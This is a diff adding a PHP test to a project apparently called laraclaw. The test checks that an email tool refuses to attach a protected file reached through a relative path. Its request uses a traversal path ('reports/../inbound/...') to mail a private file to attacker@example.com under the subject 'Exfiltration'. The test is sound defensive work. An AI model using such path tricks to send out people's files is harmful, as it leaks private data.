@@ -220,6 +220,35 @@ it('refuses to attach a file from a protected attachments directory', function (
     expect($result)->toContain('Cannot read system directory');
 });
 
+it('refuses to attach a protected file reached through a relative path', function () {
+    Storage::fake('local');
+    Storage::disk('local')->put('inbound/someone-elses-file.pdf', 'private-data');
+
+    config([
+        'laraclaw.filesystem.allowed_disks' => ['local'],
+        'laraclaw.filesystem.incoming_attachments_path' => 'inbound',
+        'laraclaw.filesystem.outgoing_attachments_path' => 'outbound',
+    ]);
+
+    Event::listen(MessageSending::class, function (): void {
+        throw new RuntimeException('The email should never have been sent.');
+    });
+
+    // This one stays inside the disk root, so the traversal check is happy with it.
+    // Only collapsing the path first reveals that it lands in a protected directory.
+    $result = emailTool()->handle(emailRequest([
+        'operation' => 'send',
+        'to' => ['attacker@example.com'],
+        'subject' => 'Exfiltration',
+        'body' => 'See attached.',
+        'attachments' => [
+            ['disk' => 'local', 'path' => 'reports/../inbound/someone-elses-file.pdf'],
+        ],
+    ]));
+
+    expect($result)->toContain('Cannot read system directory');
+});
+
 it('reports a missing attachment instead of throwing', function () {
     Storage::fake('local');
 
